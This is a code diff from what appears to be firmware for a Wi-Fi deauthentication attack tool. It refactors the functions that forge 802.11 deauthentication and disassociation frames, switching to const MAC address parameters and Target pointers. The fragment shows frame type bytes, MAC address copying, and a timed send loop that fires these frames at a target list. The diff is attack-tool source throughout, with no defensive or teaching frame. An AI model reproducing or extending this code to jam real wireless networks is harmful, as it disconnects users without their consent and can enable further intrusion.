@@ -37,7 +37,7 @@ typedef struct deauth_attack_data_t {
 deauth_attack_data_t deauth_data;
 
 // ========== SEND FUNCTIONS ========== //
-bool send_deauth(uint8_t ch, uint8_t* from, uint8_t* to) {
+bool send_deauth(uint8_t ch, const uint8_t* from, const uint8_t* to) {
     deauth_pkt[0] = 0xc0;
     memcpy(&deauth_pkt[10], from, 6);
     memcpy(&deauth_pkt[16], from, 6);
@@ -45,7 +45,7 @@ bool send_deauth(uint8_t ch, uint8_t* from, uint8_t* to) {
     return send(ch, deauth_pkt, sizeof(deauth_pkt));
 }
 
-bool send_disassoc(uint8_t ch, uint8_t* from, uint8_t* to) {
+bool send_disassoc(uint8_t ch, const uint8_t* from, const uint8_t* to) {
     deauth_pkt[0] = 0xa0;
     memcpy(&deauth_pkt[10], from, 6);
     memcpy(&deauth_pkt[16], from, 6);
@@ -82,13 +82,13 @@ void startDeauth(TargetList& targets, bool deauth, bool disassoc, unsigned long 
         targets.begin();
 
         while (targets.available()) {
-            Target t = targets.iterate();
+            Target* t = targets.iterate();
             debug("- From ");
-            debug(strh::mac(t.from()));
+            debug(strh::mac(t->getFrom()));
             debug(" to ");
-            debug(strh::mac(t.to()));
+            debug(strh::mac(t->getTo()));
             debug(" on channel ");
-            debugln(t.ch());
+            debugln(t->getCh());
         }
 
         debug("With ");
@@ -161,10 +161,10 @@ void updateDeauth() {
         }
 
         if (millis() - d.pkt_time >= d.pkt_interval) {
-            Target t = d.targets.iterate();
+            Target* t = d.targets.iterate();
 
-            if (d.deauth) d.pkts_per_second += send_deauth(t.ch(), t.from(), t.to());
-            if (d.disassoc) d.pkts_per_second += send_disassoc(t.ch(), t.from(), t.to());
+            if (d.deauth) d.pkts_per_second += send_deauth(t->getCh(), t->getFrom(), t->getTo());
+            if (d.disassoc) d.pkts_per_second += send_disassoc(t->getCh(), t->getFrom(), t->getTo());
 
             d.pkt_time = millis();
         }
